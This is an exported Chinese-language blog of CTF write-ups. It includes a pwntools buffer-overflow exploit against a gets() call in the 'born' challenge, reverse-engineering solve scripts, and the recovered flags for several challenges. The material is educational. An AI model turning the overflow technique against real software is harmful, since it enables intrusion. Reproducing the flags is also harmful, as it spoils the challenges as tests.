{"meta":{"title":"4eriri's blog","subtitle":null,"description":null,"author":"4eriri","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"born","slug":"cgctf-born","date":"2018-10-02T08:37:30.000Z","updated":"2018-10-02T08:45:44.892Z","comments":true,"path":"2018/10/02/cgctf-born/","link":"","permalink":"http://yoursite.com/2018/10/02/cgctf-born/","excerpt":"","text":"题目地址 看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333 打开test.c: 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;struct Student &#123; char name[8]; int birth;&#125;;int main(void) &#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); struct Student student; printf(&quot;What\\&apos;s Your Birth?\\n&quot;); scanf(&quot;%d&quot;, &amp;student.birth); while (getchar() != &apos;\\n&apos;) ; if (student.birth == 1926) &#123; printf(&quot;You Cannot Born In 1926!\\n&quot;); return 0; &#125; printf(&quot;What\\&apos;s Your Name?\\n&quot;); gets(student.name); printf(&quot;You Are Born In %d\\n&quot;, student.birth); if (student.birth == 1926) &#123; printf(&quot;You Shall Have Flag.\\n&quot;); system(&quot;cat flag&quot;); &#125; else &#123; printf(&quot;You Are Naive.\\n&quot;); printf(&quot;You Speed One Second Here.\\n&quot;); &#125; return 0;&#125; 发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下： 12345from pwn import *sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)sh.sendline(&apos;0&apos;)sh.sendline(&apos;0&apos;*8 + p32(1926))sh.interactive flag get","categories":[],"tags":[]},{"title":"十一欢乐赛","slug":"十一欢乐赛","date":"2018-10-02T05:03:23.000Z","updated":"2018-10-02T05:36:46.828Z","comments":true,"path":"2018/10/02/十一欢乐赛/","link":"","permalink":"http://yoursite.com/2018/10/02/十一欢乐赛/","excerpt":"","text":"HelloReverse直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。 HelloPythonpyc文件反编译一波直接运行，得不到flag分析一波程序。 123if len(sys.argv) &lt; 5: print(&quot;I can&apos;t give you flag :(&quot;) sys.exit(0) 找到了一个判断条件，直接把exit(0)去掉 再把输入flag的判断条件改为1： 12if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]): print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;)) 运行发现n = None // 2会报错改成n=1试试发现输出了一个S应该就是flag的开头 最后尝试出n=33时输出完整flag XOR1ida打开发现直接把两个数组异或就能得到flag XOR2和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。 Maze写过了maze就很容易了，wasd对应上下左右移动地图如下： 123456789OOOO*OOOOO1111O11OO1OOOO1OOO11O111OOOO111OO1OOOO1OO11OOOO111O1OOOO1O1111OOOOOOOO1 沿着1走到*得到flag 加上SUSCTF{} 题目都很简单，其他方向的也都是当场百度就能做(pwn还没","categories":[],"tags":[]},{"title":"cgctf-homuraVM","slug":"cgctf-homuraVM","date":"2018-09-29T10:23:34.000Z","updated":"2018-09-29T12:30:24.435Z","comments":true,"path":"2018/09/29/cgctf-homuraVM/","link":"","permalink":"http://yoursite.com/2018/09/29/cgctf-homuraVM/","excerpt":"","text":"题目地址 ida打开F5主函数代码,要求输入一个字符串s 然后input[i+1]=s[i]input[0]=s[len(s)-1] 之后把两个很长的字符串分别赋值到v39,v40 sub_8DC函数根据这两个字符串对input进行操作 sub_8AA不知道是干啥的，后百度得知是反调试 最后将处理过的input与给定的值对比，相同则ok value1和value2初始值为0 i为很长的字符串的下标 读取到每个字符对应到的操作如下： 12345678910111213141516171819case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++icase &quot;G&quot;:--*value2 ++icase &quot;M&quot;:*value2=*value1+*input ++icase &quot;T&quot;:++*value2 ++icase &quot;[&quot;:if *input!=0 ++i else i为]后一位case &quot;]&quot;:if *input!=0 i为[后一位 else ++icase &quot;a&quot;:--*value1 ++icase &quot;h&quot;:input=input+4 ++icase &quot;m&quot;:++*input ++icase &quot;o&quot;:input=input-4 ++icase &quot;r&quot;:++*value1 ++icase &quot;u&quot;:--*input ++icase &quot;v&quot;:*value2=*value1 ++icase &quot;&#123;&quot;:if *value2!=0 ++i else i为&#125;后一位case &quot;&#125;&quot;:if *value2!=0 i为&#123;后一位 else ++i 注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下 12345678910111213141516171819202122232425262728293031323334h[ur]ovMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125; 其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG} 1234567891011121314151617181920[ur]： *value1=*input *input减到0 &#123;aG&#125;： *value1-=*value2 *value2减到0 &#123;mG&#125;： *input+=*value2 *value2减到0 hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:input+=4*value2=*value1*value1-=*value2*value2=0*value1=*input*input=0input-=4*value2=*value1.. 此部分仅ar数量及顺序不同，控制*value1.*value2=*value1+*input*value2-=2*(*value1&amp;*ipnut)input+=4*input+=*value2*value2=0 作用为：input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i]) 不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1] 12345678import stringfinal=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]ar=&apos;&apos;for i in range(33): for s in string.printable: if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]: ar+=sprint ar 得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\\aqc/M} 接下来根据ar的个数进行逆运算即可: 123456operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\\\aqc/M&#125;&apos;)for i in range(len(operate)): final[i]=chr(operate[i]+ord(final[i]))flag=&apos;&apos;.join(final)print flag 得到flag第二位开始为lag{D3v1L_H0mur4_f**k_y0uR_bra1N} 很明显第一位为f 手动添加上 flag get","categories":[],"tags":[]},{"title":"sus-ccc","slug":"sus-ccc","date":"2018-09-26T14:52:35.000Z","updated":"2018-09-27T14:47:26.943Z","comments":true,"path":"2018/09/26/sus-ccc/","link":"","permalink":"http://yoursite.com/2018/09/26/sus-ccc/","excerpt":"","text":"题目地址 主函数很简单，直接看验证函数： 1234567891011v6 = 0;if ( a2 != 42 ) return 0;for ( i = 3; i &lt;= 42; i += 3 )&#123; v3 = crc32(0, (_BYTE *)a1, i); v4 = v6++; if ( v3 != hashes[v4] ) return 0;&#125;return 1; 输入一共42位，1-3，1-6，1-9一直到1-42循环经过crc32函数处理后与hashes值进行比对，一共比对14次。crc32函数如下： 123456789v6 = a2; for ( i = ~a1; ; i = (i &gt;&gt; 8) ^ crc32_tab[(unsigned __int8)(i ^ *v3)] ) &#123; v4 = a3--; if ( !v4 ) break; v3 = v6++; &#125; return ~i; 然而不管是写爆破脚本还是逆运算脚本都没能得到flag……觉得自己对函数的理解没有错误，百度了一下python中~0=-1,c语言中~0=1，所以出了问题。看了大佬的writeup发现python里可以使用crc32函数，于是爆破脚本如下： 123456789101112131415#!/usr/bin/env pythonimport stringimport binasciihashes=[0xD641596F,0x80A3E990,0xC98D5C9B,0xD05AFAF,0x1372A12D,0x5D5F117B,0x4001FBFD,0xA7D2D56B,0x7D04FB7E,0x2E42895E,0x61C97EB3,0x84AB43C3,0x9FC129DD,0xF4592F4D]flag=&apos;&apos;for n in hashes: for i in string.printable: for j in string.printable: for k in string.printable: temp+=i+j+k if binascii.crc32(temp)&amp;0xffffffff == n: flag+=i+j+k break;print flag flag get","categories":[],"tags":[]},{"title":"sus-accumulator","slug":"sus-accumulator","date":"2018-09-24T07:15:10.000Z","updated":"2018-09-24T07:32:29.961Z","comments":true,"path":"2018/09/24/sus-accumulator/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-accumulator/","excerpt":"","text":"题目地址 拖进ida 主函数： 12345678910111213141516171819202122232425262728293031323334__int64 v3; // rbx char v4; // al signed __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-458h] char v7; // [rsp+3Fh] [rbp-419h] char input; // [rsp+40h] [rbp-418h] unsigned __int64 v9; // [rsp+448h] [rbp-10h] v3 = 0LL; v9 = __readfsqword(0x28u); __printf_chk(1LL, &quot;What&apos;s your flag? &quot;, a3); do &#123; v4 = _IO_getc(stdin); if ( v4 == &apos;\\n&apos; ) break; if ( v4 == -1 ) break; *(&amp;v7 + ++v3) = v4; &#125; while ( v3 != 1024 ); if ( SHA512((__int64)&amp;input, v3, (__int64)&amp;v6) )// v6=sha512(input) &#123; sub_4008C0((unsigned __int8 *)&amp;v6, 64LL); sub_4008C0((unsigned __int8 *)&amp;input, v3); puts(&quot;Good flag for you.&quot;); result = 0LL; &#125; else &#123; puts(&quot;error&quot;); result = 1LL; &#125; return result; do~while循环里是读取输入，最多读取1024位，遇到回车符或读取完则停止，很明显if条件必成立，v6=sha512(input)，进入sub4008c0函数 123456789101112131415161718192021222324252627if ( a2 ) &#123; v2 = i + *a1; // i,j初始为0 v3 = v2 == dword_601080[j]; v4 = (unsigned int)(j + 1); i += *a1; ++j; if ( !v3 ) &#123;LABEL_8: puts(&quot;Bad flag :(&quot;); exit(1); &#125; v5 = a1 + 1; v6 = &amp;a1[a2]; while ( v5 != v6 ) &#123; v7 = *v5++; v2 += v7; v3 = v2 == dword_601080[v4]; i = v2; j = v4 + 1; if ( !v3 ) goto LABEL_8; v4 = (unsigned int)(v4 + 1); &#125; &#125; 一开始没分析出i和j的作用…对应的地址内存值为????一脸懵逼以为是没看见赋值，后知道了i和j是下标的作用，很容易分析出dword601080处的值就是input累加的结果，也就是说flag和dword601080内存值的位数是相等的，直接根据第二次sub4008c0就可以逆运算出flag，不需要管if条件对v6的操作以及第一次此函数对v6值的校验。然而照这样手动逆运算了前几个值，并没有得到类似于flag开头之类的字符，以为是分析错了，又看了好几遍函数，结果只是flag并不是从头开始……前几位是无意义的字符而已， 首次使用了idc脚本dump下了dword601080处内存，逆运算脚本如下： 123456a=[195,255,493,584,799,929,946,1086,1180,1184,1421,1595,1805,1846,2081,2320,2430,2605,2727,2972,3213,3403,3418,3649,3712,3950,3989,4193,4228,4394,4523,4624,4706,4935,4999,5072,5106,5291,5510,5536,5644,5751,5993,6118,6126,6198,6211,6410,6469,6609,6647,6752,6978,7010,7053,7106,7274,7468,7563,7673,7706,7956,8146,8187,8257,8333,8398,8469,8592,8640,8693,8742,8793,8844,8901,8953,9007,9062,9113,9161,9215,9317,9374,9429,9483,9540,9591,9644,9692,9741,9792,9846,9944,9996,10045,10144,10195,10246,10294,10350,10402,10450,10551,10652,10750,10849,10946,11045,11096,11147,11202,11304,11353,11451,11507,11605,11653,11753,11852,11900,11951,12052,12105,12161,12259,12360,12409,12461,12563,12664,12718,12775,12823,12921,12970,13020,13071,13173,13227,13276,13374,13422,13521,13569,13667,13718,13771,13873,13972,14029,14080,14179,14278,14377,14432,14482,14531,14579,14627,14679,14732,14789,14840,14894,14951,15052,15154,15210,15263,15314,15363,15460,15509,15610,15666,15763,15818,15916,15968,16018,16075,16132,16233,16288,16386,16443,16543,16600,16655,16703,16801,16858,16955,17005,17056,17153,17250,17375]b=[195]for i in range(1,len(a)): b.append(a[i]-a[i-1])s=&apos;&apos;.join([chr(i)for i in b])print s 忽略掉前几个无意义字符后出现flag{} 12sH1rkEr:desktop macbook$ python 1.py?;?&amp;i? +5??_n!??)FLAG&#123;051339467306f9769350136b41c330840eebcac337f1b8b0dc03e58be14fe690b123f61b0c0b35fc93ccc72100459369ef8531a1e8a7b4299e7b9d970b9a23aa&#125; flag get","categories":[],"tags":[]},{"title":"sus-pyyy","slug":"sus-pyyy","date":"2018-09-24T04:22:05.000Z","updated":"2018-09-24T04:28:57.306Z","comments":true,"path":"2018/09/24/sus-pyyy/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-pyyy/","excerpt":"","text":"题目地址 下载下来是个pyc文件，直接反编译一波： 12345678910111213141516171819202122232425#!/usr/bin/env python__import__(&apos;sys&apos;).setrecursionlimit(1048576)data = &apos;Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI&apos;a = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907Lb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499Lc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619Ld = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053Le = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707LF = (a,b,c,d,e)m = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011Lg = 67051725181167609293818569777421162357707866659797065037224862389521658445401Lz = []for i, f in enumerate(F): n = pow(f, m, g) this_is = &apos;Y-Combinator&apos; l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: (1 if x &lt; 2 else f(x - 1) * x % n))(g % 27777) c = raw_input(&apos;Channenge #%d:&apos; % i) if int(c) != l: print &apos;Wrong~&apos; exit() z.append(l)z.sort()gg = &apos;(flaSg\\&apos;7 \\\\h#GiQwt~66\\x0csxCN]4sT&#123;? Zx YCf6S&gt;|~`\\x0c$/&#125;\\&apos;\\r:4DjJFvm]([sP%FMY&quot;@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&amp;h!&#125;GLGt\\&apos;=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c&gt;Vj/&gt;rnWXgLP#&lt;+4$BG@,\\&apos;n a_7C:-&#125;f(WO8Y\\x0c2|(nTP!\\&apos;\\\\&gt;^\\&apos;&#125;-7+AwBV!w7KUq4Qpg\\tf.&#125;Z7_!m+ypy=`3#\\\\=?9B4=?^&#125;&amp;\\&apos;~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\&apos;y4dQW5!~g~I*f&quot;rz1&#123;qQH&#123;G9\\x0c\\&apos;b\\x0cp\\x0bdu!2/\\\\@i4eG&quot;If0A&#123;-)N=6GMC&lt;U5/ds\\rG&amp;z&gt;P1\\nsq=5&gt;dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\&apos;ujN&lt;&quot;LJ\\x0c5R4&quot;\\\\\\\\XPVA\\&apos;m$~tj)Br&#125;C&#125;&amp;kX2&lt;|\\np3XtaHB.P\\&apos;(E 4$dm!uDyC%u [&quot;x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?&#123;%e\\x0b]wN_&#125;*Q:mh&gt;@]u\\t&amp;6:Z*Fmr?U`cOHbAf7s@&amp;5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&amp;h1(ozoZ)mrA=`HKo\\n\\&apos;rXm&#125;Z-l3]WgN\\\\NW&lt;&#123;o=)[V(&#123;7&lt;N1.-A8S&quot;=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3&lt;w-g\\&apos;/j\\&apos;\\tM4|9l?i&amp;tm_\\n57X0B2rOpuB@H@%L_\\r)&amp;/q=LZa(%&#125;&quot;&quot;#if#Kq74xK?`jGFOn&quot;8&amp;^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%&quot;Tu:!UsE],0Dp s@HErS]J&#123;%oH54B&amp;(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\&apos;\\&apos;fX\\r&#125;EBk_7\\x0b:&gt;8~\\t+M@WJx.PO(&#123;/U&#125;1&#125;#TqjreG\\nN&#123;\\rX&gt;4EsJr0Pn\\\\Z\\\\aL/-U&lt;&lt;&#123;,Q;j\\tF=7f\\&apos;)+wH:p&#123;G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE&lt;uo]~$&gt;5k]FW+&gt;fR&lt;QA&quot;(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&amp;p-&lt;b&quot;3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&amp;n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t&#125;\\&apos;F$l1:b2Bd\\na=#t0iq&#125;#!&#123;1_)w$&#125;&lt;Dp(borC\\&apos;\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl&#123;&amp;fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP&gt;MmfB\\n8O4/&quot;&#125;nE7r*=41f2\\t37&gt;K\\&apos;s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4&amp; dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.&#123;O\\t$q0\\x0ch_@?w@b8[I^&#123;JL|O8]i8&#123;p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B&#125;]J])6fak/3r]W\\tMeXt[uc(1_U lys&#123;a1X\\r%)[wwP3rhgNW&#123;*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`&#125;1+D8&quot;\\t`@V~$9l$Uy**VnI (@Ga0&lt;RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa&quot;\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe&gt;3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\&apos;\\t&lt;\\x0cV&gt;@X@-Ei4%sO%&#125;,B_pjc`s&quot;@oKCmdgDhjUZT@?mb\\&apos;?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!&quot;)xFOEF(x!3M\\t:l83|&#125;&#125;HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\&apos;S|tb&gt;RX` ca*CO&lt;w\\x0ci =wc1,M~\\x0bc`FYEs\\r)&#123;+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\&apos;SOhqxP|k7cw Hm?I@?P\\&apos;HmapG7$0#T(Auz]sjmd#\\rFP/&#125;53@-Kvmi(d%dZKLZ2LK\\&apos;e_E\\x0bQmR 5/(irq4-EUyp&lt;hB?[\\tnU:p*xuzASM&apos;print &apos;&apos;.join((gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: (1 if n &lt; 3 else f(n - 1) + f(n - 2)))(i + 2)] for i in range(16))) % &apos;&apos;.join((data[pow((__import__(&apos;fractions&apos;).gcd(z[i % 5], z[(i + 1) % 5]) * 2 + 1) * g, F[i % 5] * (i * 2 + 1), len(data))] for i in range(32))) 先运行一波： 123sH1rkEr:desktop macbook$ python 1.pyChannenge #0:111Wrong~ 观察到print ‘Wrong~’ 上面的if int(c) != l 可能就是判断条件，把!=改成==尝试一波 1234567sH1rkEr:desktop macbook$ python 1.pyChannenge #0:1Channenge #1:1Channenge #2:122313Channenge #3:123Channenge #4:13flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125; flag get 话说只能做做这种简单的题目了QAQ","categories":[],"tags":[]},{"title":"sus-helloworld","slug":"sus-helloworld","date":"2018-09-22T16:19:46.000Z","updated":"2018-09-22T16:28:18.670Z","comments":true,"path":"2018/09/23/sus-helloworld/","link":"","permalink":"http://yoursite.com/2018/09/23/sus-helloworld/","excerpt":"","text":"题目地址 ida启动 main函数: 123456789101112131415161718192021*(_DWORD *)flag = 0xC881E8F1;*(_DWORD *)&amp;flag[4] = 0xCECF81D2;*(_DWORD *)&amp;flag[8] = 0x81C081D5;*(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;*(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;*(_DWORD *)&amp;flag[20] = 0xCCD4CF81;*(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;flag[28] = 0;printf(&quot;What is magic number? &quot;);__isoc99_scanf(&quot;%d&quot;, &amp;n);if ( n == 0x12B9B0A1 )&#123; for ( i = 0; flag[i]; ++i ) flag[i] ^= n; printf(&quot;Flag is FLAG&#123;%s&#125;\\n&quot;, flag);&#125;else&#123; puts(&quot;Try Hard.&quot;);&#125;return 0; 如果输入的n为0x12b9b0a1，flag[i]^=n 通过汇编命令可以发现此处n取一个byte，也就是0xa1 逆运算脚本如下： 123456789101112flag=[0xf1,0xe8,0x81,0xc8,0xd2,0x81,0xcf,0xce,0xd5,0x81,0xc0,0x81,0xd3,0xc0,0xd5,0xc8,0xce,0xcf,0xc0,0xcd,0x81,0xcf,0xd4,0xcc,0xc3,0xc4,0xd3,0x8f]s=&apos;&apos;for i in flag: i^=0xa1 s+=chr(i)print s flag get 因为不会啥操作，所以flag list只能手打了……","categories":[],"tags":[]},{"title":"sus-bitx","slug":"bitx","date":"2018-09-22T11:33:03.000Z","updated":"2018-09-22T16:19:09.808Z","comments":true,"path":"2018/09/22/bitx/","link":"","permalink":"http://yoursite.com/2018/09/22/bitx/","excerpt":"","text":"题目地址 拖进ida，主函数一目了然，直接进入验证函数： 123456for ( i = 0; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + 0x804A040); ++i )&#123; if ( *(_BYTE *)(i + a1) + 9 != ((unsigned __int8)((*(_BYTE *)(i + 0x804A040) &amp; 0xAA) &gt;&gt; 1) | (unsigned __int8)(2 * (*(_BYTE *)(i + 0x804A040) &amp; 0x55))) ) return 0;&#125;return 1; 将输入与0x804a040处的值经过一系列运算后比较若不相等则gg，直接写脚本： 123456final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]flag=finalfor i in range(len(final)): flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9out=&apos;&apos;.join([chr(i) for i in flag])print out flag get","categories":[],"tags":[]},{"title":"base64","slug":"base64","date":"2018-09-22T06:58:58.000Z","updated":"2018-09-22T07:09:04.289Z","comments":true,"path":"2018/09/22/base64/","link":"","permalink":"http://yoursite.com/2018/09/22/base64/","excerpt":"","text":"百度了一会base64，在吾爱破解上发现了一篇讲解很详细的文章，于是尝试自己实现base64加密 12345678910111213141516171819202122232425262728293031323334353637383940letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, 